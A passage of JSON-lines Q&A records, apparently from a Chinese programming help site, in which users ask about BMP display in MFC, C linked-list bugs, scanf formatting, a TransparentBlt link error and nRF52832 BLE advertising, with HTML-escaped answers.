m_bmp(strFilename,CFile::modeRead);", "\nm_bmp.SeekToBegin();", "\n//读取bmp文件头", "\nm_bmp.Read(&format,sizeof(unsigned short));", "\nif(0x4d42!=format){//查看图片文件格式", "\n    AfxMessageBox(_T(\"The format of this bmp image is not supported by Windows!\"));", "\n}", "\nm_bmp.Seek(0xa,CFile::begin);  //读取到位图数据需要的偏移量", "\nm_bmp.Read(&offset,sizeof(unsigned int));", "\nm_bmp.Seek(0x12,CFile::begin);  //读取位图宽高", "\nm_bmp.Read(&bmp_width,sizeof(unsigned int));", "\nm_bmp.Read(&bmp_height,sizeof(int));", "\nm_bmp.Seek(0x1c,CFile::begin);  //读取位图格式（256色，24位，32位）", "\nm_bmp.Read(&bit_per_pix,sizeof(unsigned short));", "\nm_bmp.Seek(offset,CFile::begin);//定位到位图数据", "\nCClientDC dc(this);", "\nint x,y;", "\nif(24==bit_per_pix){   //如果是24位位图，则执行下列代码", "\nif(bmp_height>0)", "\nfor(y=0;y<bmp_height;y++){", "\nfor(x=0;x<(int)bmp_width;x++){", "\nm_bmp.Read(&b,sizeof(unsigned short));", "\nm_bmp.Read(&g,sizeof(unsigned short));", "\nm_bmp.Read(&r,sizeof(unsigned short));", "\ndc.SetPixel(x,(bmp_height-y-1),RGB(r,g,b));", "\n}", "\n}", "\n}", "\n\n", "m_bmp.Close();", "\n}", "\n}", "\n这是原始图片：", "\n这是我的程序读取的结果："]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;void make(linek n[],int b[]) 函数里&amp;#xff0c;while那段修改下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;        p &amp;#61; n[e];\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p !&amp;#61; NULL)\n        {\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;b&lt;/span&gt;[p-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;a&lt;/span&gt;] &amp;#61; b[p-&amp;gt;&lt;/span&gt;a] - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;/span&gt;f;  &lt;span class=\"hljs-comment\"&gt;//这句移下来&lt;/span&gt;\n        }\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["运行时错误，一直想不明白哪里错了", ["#include<stdio.h>", "#include<stdlib.h>", "typedef struct line", "{", " int a;", " struct line *f;", "}line,*linek;", "int i;", "int e,d;", "\n", "void make(linek n[],int b[])", "{", "    linek p;", "    for(i=1;i<7;i++)", "    {", "        for(e=1;e<7;e++)", "        {", "            if(b[e]==0)", "            {", "                b[e]=10;", "                printf(\"%d \",e-1);", "                break;", "            }", "        }", "        p=n[e];", "        while(p!=NULL)", "        {", "            p=p->f;", "            b[p->a]=b[p->a]-1;", "        }", "    }", "}", "int main()", "{", "    linek n[7];", "    n[0]=(linek)malloc(sizeof(line));", "    n[0]->a=0;", "    n[0]->f=NULL;", "    for(i=1;i<7;i++)", "    {", "        n[i]=(linek)malloc(sizeof(line));", "        n[i]->a=i;", "        n[i]->f=NULL;", "    }", "    linek p,y;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=2;", "    n[1]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->a=3;", "    p->f=NULL;", "    y->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=4;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->a=2;", "    p->f=NULL;", "    n[3]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->a=5;", "    p->f=NULL;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->a=5;", "    p->f=NULL;", "    n[4]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->a=4;", "    p->f=NULL;", "    n[6]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));;", "    p->a=5;", "    p->f=NULL;", "    y->f=p;", "    int b[7]={10,0,2,1,2,3,0};", "    make(n,b);", "    return 0;", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;看来你对指针理解的不透彻&lt;br /&gt;现在&amp;#xff0c;我们把&lt;code class=\"language-javascript\"&gt;listnode *&lt;/code&gt;整体看成一个类型&amp;#xff0c;就比如假设他是type吧&amp;#xff0c;你的creatlist就成了&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;void creatlist(&lt;span class=\"hljs-built_in\"&gt;type&lt;/span&gt; list, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;你想做的是修改list的值&amp;#xff0c;但这样能做到吗&amp;#xff1f;比如说 &lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;func&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a)&lt;/span&gt;\n&lt;/span&gt;{\n  a&amp;#61;&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样能修改a的值吗&amp;#xff1f;显然不能&amp;#xff0c;如果要修改的话&amp;#xff0c;需要写成这样&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;func&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;* a)&lt;/span&gt;\n&lt;/span&gt;{\n  *a&amp;#61;&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;然后调用的时候用&lt;code class=\"language-javascript\"&gt;func(&amp;amp;x);&lt;/code&gt;&lt;br /&gt;同理&amp;#xff0c;这里如果想修改list&amp;#xff0c;需要用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;void creatlist(&lt;span class=\"hljs-built_in\"&gt;type&lt;/span&gt;* list, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;也就是&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title function_\"&gt;creatlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(listnode** list, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n)&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["创建链表的函数的函数类型", ["在写创建链表的函数时，有时需要让函数有返回值，有时不需要。忙活了半天找到两个比较有代表性的函数，希望帮忙看一下问题在哪。", "这是第一个函数（指creatlist），函数类型为void，但可以通过print函数遍历输出。", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "typedef", " ", "struct", "  ", "ListNode", "\n{\n    ", "int", " data;\n    ", "struct", " ", "listnode", " *next;\n    ", "/* data */", "\n}listnode;\n", "void", " ", "creatlist", "(listnode *list, ", "int", " n)", ";  ", "//这里是尾接法，所以第一个head中的数值没有发生改变", "\n", "void", " ", "printlist", "(listnode *list)", ";\n", "// listnode *readlist();", "\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " n;\n    ", "printf", "(", "\"请输入链表大小\\n\"", ");\n    ", "scanf", "(", "\"%d\"", ", &n);\n    ", "// listnode *list = readlist();", "\n    listnode *list = (listnode*)", "malloc", "(", "sizeof", "(listnode));\n    ", "creatlist", "(list, n);\n    ", "printlist", "(list);\n}\n", "void", " ", "creatlist", "(listnode *list, ", "int", " n)", "{\n    listnode *head, *node, *end;\n    head = list;\n    end = head;\n    ", "printf", "(", "\"请输入%d个数\\n\"", ",n);\n    ", "int", " i;\n    ", "for", "(i = ", "0", "; i < n; i++){\n        node = (listnode*)", "malloc", "(", "sizeof", "(listnode));\n        ", "scanf", "(", "\"%d\"", ", &node->data);\n        end->next = node;\n        end = node;\n    }\n    end->next= ", "NULL", ";\n}", "/*this is right*/", "\n", "void", " ", "printlist", "(listnode *list)", "{\n    listnode *p;\n    p = list->next;\n    ", "while", "(p!= ", "NULL", "){\n        ", "printf", "(", "\"%d \"", ", p->data);\n        p = p->next;\n    }\n}\n\n", "\n", "这是第二个函数（指creatlist），若返回类型为void，debug时发现跳出函数后链表值没有发生改变，只有返回链表才能创建。", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "//使用malloc时必须有", "\n", "typedef", " ", "struct", " ", "ListNode", "{\n    ", "int", " data;\n    ", "struct", " ", "ListNode", " *next;\n}listnode;\nlistnode *", "/*void*/", " ", "creatlist", "(listnode *L);\n", "void", " ", "printlist", "(listnode *L)", ";\n", "int", " ", "main", "()", "\n", "{\n    listnode *L = (listnode*)", "malloc", "(", "sizeof", "(listnode));", "//对要进行操作的指针必须先赋值，若为初始则用malloc分配，若是辅助指针则用其他指针赋值", "\n    L = ", "creatlist", "(L);\n    ", "printlist", "(L);\n}\nlistnode *", "/*void*/", " ", "creatlist", "(listnode *L){\n    listnode *head, *node, *end;\n    head = ", "NULL", ";", "//通过此步骤保证从头赋值", "\n    ", "printf", "(", "\"请输入一组以-1结尾的数\\n\"", ");\n    ", "int", " data;\n    ", "while", "(", "1", "){\n        ", "scanf", "(", "\"%d\"", ", &data);\n        ", "if", "(data == ", "-1", ") ", "break", ";\n        ", "else", "{\n            node = (listnode*)", "malloc", "(", "sizeof", "(listnode));", "//必须在循环中分配内存", "\n            node->data = data;\n            ", "if", "(head == ", "NULL", ") {\n                head = node;\n                end = head;\n            }\n            ", "else", " end->next = node;\n            end = node;\n        }\n    }\n    end->next = ", "NULL", ";", "//避免链表中最后某一层的next是野指针导致输出时错误", "\n    L = head;\n    ", "return", " L;", "//必须有返回", "\n}\n", "void", " ", "printlist", "(listnode *L)", "{\n    listnode *p = L;\n    ", "while", "(p){\n        ", "printf", "(", "\"%d \"", ",p->data);\n        p = p-> next;\n    }\n}\n\n", "\n", "求帮忙"]], "Tag": "程序设计"}
{"Answer": "用scanf()读取数据时，输入的格式必须和scanf()的格式控制字符串对应，比如说：\r\n1、scanf(\"%d,%d,%d\",a,b,c);;因为3个%d之间有一个逗号，所以在输入时3个整数之间只能用逗号分隔，如果用其它符号分隔就会出错（比如说此时用空格、回车分隔就会出错）\r\n2、scanf(\"%d%d%d\",a,b,c);这个格式控制字符串就可以用空白分隔（空格，回车都可以)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用指针指向3个整型存储单元，输入3个整数，输出其中的最大值", ["#include", "\n#include", "\nint main()", "\n{", "\n    int *a,*b,*c;", "\n    int max;", "\n    a=(int *)malloc(sizeof(int));", "\n    b=(int *)malloc(sizeof(int));", "\n    c=(int *)malloc(sizeof(int));", "\n    scanf(\"%d,%d,%d\",a,b,c);", "\n    if(*a>*b) max=*a;", "\n    else max=*b;", "\n    if(max<*c) max=*c;", "\n    printf(\"最大值为:%d\\n\",max);", "\n    free(a);", "\n    free(b);", "\n    free(c);", "\n    return 0;", "\n}", "\n老是第一个大，比如 1 2 3max=1    2 1 3max=2"]], "Tag": "程序设计"}
{"Answer": "http://xuheer.blog.163.com/blog/static/74315353201167103020155/", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["MFC picture control 显示bmp图像问题", ["请大家帮我看看，这是一个用MFC做的打开24位真彩色图像，并进行处理显示的程序。目前有两个问题：", "\n\n", "\n", "本人打开320*240大小的24位真彩色BMP图像，数据大小应该为320*240 = 230400字节，但是代码中变量dataBytes 为何是230402。", "\n", "\n", "现在我是先将彩色图像数据进行灰度化（此时数据缩小为原来的1/3），然后把数据扩充（如showData函数所示）到彩色数据的大小，再进行显示。结果图：灰度图能显示完整，但有分布均匀的灰度一致的像素点。另外还有原本图像下半部区域的图像进行了放大并叠加在上半部。", "\n\n", "我怀疑是StretchDIBits显示函数和dataBytes 变量存在问题，但找了很久没有发现，忘大家不吝赐教，万分感谢。", "\n", "\n", " BITMAPINFO *pBmpInfo;\nunsigned short iBmpWidth,iBmpHeight;\nBYTE *pBmpData;\nBYTE *pGray;\nBYTE *pShowGray;\n//picture control 定义\nCWnd *pWnd;  \nCRect rect;  \nCDC *pDC;\n\nvoid showData(BYTE *in,BYTE *out,unsigned short width,unsigned short height)\n{\n    unsigned long i;\n    unsigned long len = width * height;\n    for(i = 0;i < len; i++)\n    {\n        out[i*3] = in[i];\n        out[i*3+1] = in[i];\n        out[i*3+2] = in[i];\n    }\n}\n/************************24位彩图转8位灰度图——Gray = R*a + G*b + B*c*****************************/\nvoid ColtoGray(BYTE *imageIn,BYTE *imageOut,float a,float b,float c)\n{\n    long area = IMAGEHEIGHT * IMAGEWIDTH;\n    long index;\n    unsigned char n;\n    float sum=0;\n    for(index = 0;index < area;index ++)\n    {\n        for(n=0;n<3;n++)\n        {\n            switch(n)\n            {\n                case 0:\n                    sum=sum+imageIn[index]*a;   break;\n                case 1:\n                    sum=sum+imageIn[index*3+1]*b; break;\n                case 2:\n                    sum=sum+imageIn[index*3+2]*c; break;\n            }\n        }\n        imageOut[index]=sum;\n        sum=0;\n    }\n}\n\n//打开按钮按下，打开24位真彩色图片\nvoid CMFCDlg::OnBnClickedButton2()\n{\n    // TODO: 在此添加控件通知处理程序代码\n    BITMAPFILEHEADER bmpHeader;//文件头  \n    BITMAPINFOHEADER bmpInfo;//信息头 \n\n    CFileDialog dlg( TRUE , \"(*.bmp)|*.bmp\",\"*.bmp\" ,OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT ,\"位图文件(*.bmp)\"); \n    CFile bmpFile;//记录打开文件 \n    CString strFileName;//记录选择文件路径  \n    if (!dlg.DoModal() == IDOK) \n        return;  \n    strFileName = dlg.GetPathName(); \n\n    //以只读的方式打开文件  \n    if(!bmpFile.Open(strFileName, CFile::modeRead|CFile::typeBinary)) \n        return;  \n    if (bmpFile.Read(&bmpHeader,sizeof(BITMAPFILEHEADER)) != sizeof(BITMAPFILEHEADER))  \n    {   \n        AfxMessageBox(\"读取文件失败!\");   \n        return;  \n    }  \n    if (bmpHeader.bfType != 0x4d42)  \n    {   \n        AfxMessageBox(\"未能识别bmp格式文件!\");   \n        return;  \n    }  \n    if (bmpFile.Read(&bmpInfo,sizeof(BITMAPINFOHEADER)) != sizeof(BITMAPINFOHEADER))  \n    {   \n        AfxMessageBox(\"读取bmp文件头失败!\");   \n        return;  \n    }  \n    if (bmpInfo.biBitCount != 24)  \n    {  \n        AfxMessageBox(\"您读取的不是24位真彩色图像!\");  \n        return; \n    }\n    pBmpInfo = (BITMAPINFO *)new char[sizeof(BITMAPINFOHEADER)];  \n    if (!pBmpInfo)  \n    {  \n        AfxMessageBox(\"内存分配错误!\");   \n        return;  \n    } \n    //为图像数据申请空间  \n    memcpy(pBmpInfo,&bmpInfo,sizeof(BITMAPINFOHEADER));  \n    DWORD dataBytes = bmpHeader.bfSize - bmpHeader.bfOffBits;  \n\n    pBmpData = (BYTE*)new char[dataBytes];  \n    if (!pBmpData)  \n    {   \n        AfxMessageBox(\"内存分配错误!\");   \n        delete pBmpData;   \n        return;  \n    }  \n    if (bmpFile.Read(pBmpData,dataBytes) != dataBytes)  \n    {   \n        AfxMessageBox(\"读取图像数据失败!\");   \n        delete pBmpInfo;   \n        delete pBmpData;  \n        return;  \n    } \n    bmpFile.Close();   \n    pWnd=GetDlgItem(IDC_STATIC);//获得pictrue控件窗口的句柄  \n    //CRect rect;  \n    pWnd->GetClientRect(&rect);//获得pictrue控件所在的矩形区域  \n    pDC=pWnd->GetDC();//获得pictrue控件的DC     \n\n    //显示图片  \n    pDC->SetStretchBltMode(COLORONCOLOR);   \n    StretchDIBits(pDC->GetSafeHdc(),0,0,rect.Width(),rect.Height(),0,0,bmpInfo.biWidth,bmpInfo.biHeight,pBmpData,pBmpInfo,DIB_RGB_COLORS,SRCCOPY);   \n\n    iBmpWidth=bmpInfo.biWidth;                       \n    iBmpHeight=bmpInfo.biHeight; \n}\n\n//灰度化按下\nvoid CMFCDlg::OnBnClickedButton3()\n{\n    // TODO: 在此添加控件通知处理程序代码\n\n    pGray = (BYTE*)new char[320*240]; \n    pShowGray = (BYTE*)new char[320*240*3];\n    ColtoGray(pBmpData,pGray,0.3,0.3,0.3);\n    showData(pGray,pShowGray,iBmpWidth,iBmpHeight);\n    pWnd=GetDlgItem(IDC_STATIC);//获得pictrue控件窗口的句柄  \n    //CRect rect;  \n    pWnd->GetClientRect(&rect);//获得pictrue控件所在的矩形区域  \n    pDC=pWnd->GetDC();//获得pictrue控件的DC     \n\n    //显示图片  \n    pDC->SetStretchBltMode(COLORONCOLOR);   \n    StretchDIBits(pDC->GetSafeHdc(),0,0,rect.Width(),rect.Height(),0,0,iBmpWidth,iBmpHeight,pShowGray,pBmpInfo,DIB_RGB_COLORS,SRCCOPY);   \n}\n\n"]], "Tag": "程序设计"}
{"Answer": "很明显你的代码是从哪抄来的\r\n点击菜单：项目-&gt;项目属性-&gt;参数-&gt;链接\r\n复制一下内容到“链接”文本框\r\n\"C:/Program Files (x86)/Dev-Cpp/MinGW64/x86_64-w64-mingw32/lib32/libmsimg32.a\"\r\n完成后点击确定", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个使用TransparentBlt()时出现的问题（使用Dev c++)", ["代码如下", "\n\n", "/*本程序用来插入一张图片*/", "\n\n", "#include ", "\n\n", "#pragma comment(lib,\"msimg32.lib\")", "\n\n", "#define   wnd_width       640   //窗口的宽", "\n#define   wnd_height      480   //窗口的高", "\n\n", "HDC     hdc;           //窗口设备句柄", "\nHDC     memdc;         //内存设备句柄", "\nHDC     bufmemdc;      //内存设备句柄 ", "\nHBITMAP bmp;           //空位图", "\nHBITMAP backbmp;       //背景图片 ", "\n\n", "LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {", "\n    switch(Message) {", "\n        case WM_PAINT:{", "\n            BitBlt(hdc,0,0,500,500,memdc,0,0,SRCCOPY);", "\n\n", "        break;\n    }\n\n\n    case WM_DESTROY: {\n        PostQuitMessage(0);\n        break;\n    }\n\n\n    default:\n        return DefWindowProc(hwnd, Message, wParam, lParam);\n}\nreturn 0;\n", "\n\n", "}", "\n\n", "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "\n    WNDCLASSEX wc; ", "\n    HWND hwnd; ", "\n    MSG msg; ", "\n\n", "memset(&wc,0,sizeof(wc));\nwc.cbSize        = sizeof(WNDCLASSEX);\nwc.lpfnWndProc   = WndProc; \nwc.hInstance     = hInstance;\nwc.hCursor       = LoadCursor(NULL, IDC_ARROW);\n\nwc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);\nwc.lpszClassName = \"WindowClass\";\nwc.hIcon         = LoadIcon(NULL, IDI_APPLICATION); \nwc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION); \n\nif(!RegisterClassEx(&wc)) {\n    MessageBox(NULL, \"Window Registration Failed!\",\"Error!\",MB_ICONEXCLAMATION|MB_OK);\n    return 0;\n}\n\nhwnd = CreateWindowEx(WS_EX_CLIENTEDGE,\"WindowClass\",\"Caption\",WS_VISIBLE|WS_OVERLAPPEDWINDOW,\n    CW_USEDEFAULT, \n    CW_USEDEFAULT, \n    wnd_width, \n    wnd_height, \n    NULL,NULL,hInstance,NULL);\n\n\n\nif(hwnd == NULL) {\n    MessageBox(NULL, \"Window Creation Failed!\",\"Error!\",MB_ICONEXCLAMATION|MB_OK);\n    return 0;\n}\n\n\n\nhdc       = GetDC(hwnd);\nbufmemdc  = CreateCompatibleDC(hdc);\nmemdc     = CreateCompatibleDC(hdc);\nbmp       = CreateCompatibleBitmap(hdc,wnd_width,wnd_height);\nbackbmp   = (HBITMAP)LoadImage(NULL,\"./picture/n.bmp\",IMAGE_BITMAP,500,500,LR_LOADFROMFILE);\n\nSelectObject(memdc,bmp);\nSelectObject(bufmemdc,backbmp);\n\nTransparentBlt(memdc,0,0,500,500,bufmemdc,0,0,500,500,RGB(0,0,5));\n\n\nwhile(GetMessage(&msg, NULL, 0, 0) > 0) { /* If no error is received... */\n    TranslateMessage(&msg); /* Translate key codes to chars if present */\n    DispatchMessage(&msg); /* Send it to WndProc */\n}\nreturn msg.wParam;\n", "\n\n", "}", "\n\n", "然后编译运行的时候，页面就跳转到MakeFile", "\n\n", "Project: 插入图片", "\n\n", "Makefile created by Dev-C++ 5.9.2", "\n\n", "CPP      = g++.exe", "\nCC       = gcc.exe", "\nWINDRES  = windres.exe", "\nOBJ      = main.o", "\nLINKOBJ  = main.o", "\nLIBS     = -L\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/lib\" -L\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/x86_64-w64-mingw32/lib\" -static-libgcc -mwindows", "\nINCS     = -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/include\" -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/x86_64-w64-mingw32/include\" -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/lib/gcc/x86_64-w64-mingw32/4.8.1/include\"", "\nCXXINCS  = -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/include\" -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/x86_64-w64-mingw32/include\" -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/lib/gcc/x86_64-w64-mingw32/4.8.1/include\" -I\"D:/devc++/dev-cpp_gr/dev-cpp_gr/Dev-Cpp/MinGW64/lib/gcc/x86_64-w64-mingw32/4.8.1/include/c++\"", "\nBIN      = 插入图片.exe", "\nCXXFLAGS = $(CXXINCS) ", "\nCFLAGS   = $(INCS) ", "\nRM       = rm.exe -f", "\n\n", ".PHONY: all all-before all-after clean clean-custom", "\n\n", "all: all-before $(BIN) all-after", "\n\n", "clean: clean-custom", "\n    ${RM} $(OBJ) $(BIN)", "\n\n", "$(BIN): $(OBJ)", "\n    $(CC) $(LINKOBJ) -o $(BIN) $(LIBS)", "\n\n", "main.o: main.c", "\n    $(CC) -c main.c -o main.o $(CFLAGS)", "\n\n", "出现了如下的报错信息：", "\n\n", "D:\\dev-c++文档\\插入图片\\main.o    main.c:(.text+0x39b): undefined reference to `__imp_TransparentBlt'", "\n\n", "D:\\dev-c++文档\\插入图片\\collect2.exe  [Error] ld returned 1 exit status", "\n25  ", "\n\n", "D:\\dev-c++文档\\插入图片\\Makefile.win  recipe for target '插入图片.exe' failed", "\n\n", "求助是什么原因，怎么解决"]], "Tag": "程序设计"}
{"Answer": "0x09就是BLE_GAP_AD_TYPE_COMPLETE_LOCAL_NAME，你广播数据中添加了advdata.name_type  = BLE_ADVDATA_FULL_NAME;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["NRF 52832 蓝牙 如何发送自定义广播报文", ["这个是我下载nordic_template 程序到开发板上 用nrf connect 工具 获取的数据，", "\n现在我需要发送自定义的广播报文，该怎么修改呢，", "\n这个是广播初始化函数：", "\n\n", "static void advertising_init(void)", "\n{", "\n    uint32_t               err_code;", "\n    ble_advdata_t          advdata;", "\n    ble_adv_modes_config_t options;", "\n\n", "// Build advertising data struct to pass into @ref ble_advertising_init.\nmemset(&advdata, 0, sizeof(advdata));\n\nadvdata.name_type               = BLE_ADVDATA_FULL_NAME;\nadvdata.include_appearance      = false;\nadvdata.flags                   = BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE;\n", "\n\n", "//    advdata.uuids_complete.uuid_cnt = sizeof(m_adv_uuids) / sizeof(m_adv_uuids[0]);", "\n//    advdata.uuids_complete.p_uuids  = m_adv_uuids;", "\n\n", "  static ble_advdata_manuf_data_t manuf_data;\nstatic uint8_t mydata = 0;  //?????????\n                        //?????????????????\n                        //?,???????????????1\nmanuf_data.company_identifier = 0xC7;\nmanuf_data.data.size = 1;\nmanuf_data.data.p_data = &mydata;\n\n//mydata++; //??????1\nadvdata.p_manuf_specific_data = &manuf_data;\n\n\nmemset(&options, 0, sizeof(options));\noptions.ble_adv_fast_enabled  = true;\noptions.ble_adv_fast_interval = APP_ADV_INTERVAL;\noptions.ble_adv_fast_timeout  = APP_ADV_TIMEOUT_IN_SECONDS;\n\nerr_code = ble_advertising_init(&advdata, NULL, &options, on_adv_evt, NULL);\nAPP_ERROR_CHECK(err_code);\n", "\n\n", "}", "\n\n", "没有在广播初始化中代码中找到 关于第三行数据 2 0x09 0x4E ，的定义", "\n自定义的广播报文应该放在什么地方？", "\n请大神支招"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;#include&amp;lt;stdio.h&amp;gt;\n#include&amp;lt;stdlib.h&amp;gt;\ntypedef struct line\n{\n    int a;\n    struct line* f;\n}line, * linek;\nvoid make(linek n[], int v, int r, int u[])\n{\n    linek p;\n    u[v] &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt; &amp;#61; n[v]-&amp;gt;&lt;/span&gt;f;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p !&amp;#61; NULL)\n    {\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;v&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;/span&gt;a;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (u[v] !&amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)\n        {\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (v &amp;#61;&amp;#61; r)\n            {\n                printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;T&amp;#34;&lt;/span&gt;);\n                break;\n            }\n            make(n, v, r, u);\n        }\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;/span&gt;f;\n    }\n}\nint main()\n{\n    linek n[&lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;];\n    int i;\n    n[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;] &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[0]-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[0]-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        n[i] &amp;#61; (linek)malloc(sizeof(line));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[i]-&amp;gt;&lt;/span&gt;a &amp;#61; i;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[i]-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    }\n    linek p, y;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;n&lt;/span&gt;[1]-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    y &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;a &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;y&lt;/span&gt;-&amp;gt;&lt;/span&gt;f &amp;#61; p;\n    p &amp;#61; (linek)malloc(sizeof(line));\n    &lt;span class=\"hljs-function\"&gt;&lt;span 